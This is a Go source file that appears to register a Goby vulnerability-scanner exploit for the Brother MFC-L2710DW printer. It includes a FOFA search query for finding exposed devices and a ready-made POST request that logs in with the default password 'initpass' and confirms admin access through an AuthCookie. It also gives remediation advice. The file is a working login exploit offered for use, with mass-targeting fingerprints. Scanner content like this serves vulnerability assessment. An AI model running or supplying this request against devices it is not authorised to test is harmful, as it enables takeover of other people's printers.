package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "MFC-L2710DW status.html file default password vulnerability",
    "Description": "<p>The MFC-L2710DW is a printer device. The device has a default password, and attackers can control the entire platform through the default password (password: initpass) vulnerability, and use administrator privileges to operate core functions.</p>",
    "Impact": "<p>MFC-L2710DW default password vulnerability</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "MFC-L2710DW",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "MFC-L2710DW status.html 文件默认口令漏洞",
            "Product": "MFC-L2710DW",
            "Description": "<p><span style=\"font-size: medium;\"><span style=\"color: rgb(0, 0, 0);\">MFC-L2710DW&nbsp;&nbsp;</span>是一款打印机设备。该设备存在默认口令，<span style=\"color: rgb(53, 53, 53);\">攻击者可通过默认口令（密码：initpass）漏洞控制整个平台，使用管理员权限操作核心的功能。</span></span><br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p><span style=\"font-size: medium; color: rgb(53, 53, 53);\">攻击者可通过默认口令（密码：initpass）漏洞控制整个平台，使用管理员权限操作核心的功能。</span><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "MFC-L2710DW status.html file default password vulnerability",
            "Product": "MFC-L2710DW",
            "Description": "<p>The MFC-L2710DW is a printer device. The device has a default password, and attackers can control the entire platform through the default password (password: initpass) vulnerability, and use administrator privileges to operate core functions.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>MFC-L2710DW default password vulnerability</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "title==\"Brother MFC-L2710DW series\"",
    "GobyQuery": "title==\"Brother MFC-L2710DW series\"",
    "Author": "13eczou",
    "Homepage": "https://support.brother.com/",
    "DisclosureDate": "2022-04-09",
    "References": [
        "https://fofa.info/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/general/status.html",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "CSRFToken=lPRQjQ5KASuaRuxSkRh7KmQIYWY602w4AA%3D%3D&B8d5=initpass&loginurl=%2Fgeneral%2Fstatus.html"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "301",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "AuthCookie",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/general/status.html",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "CSRFToken=lPRQjQ5KASuaRuxSkRh7KmQIYWY602w4AA%3D%3D&B8d5=initpass&loginurl=%2Fgeneral%2Fstatus.html"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "301",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "AuthCookie",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10368"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
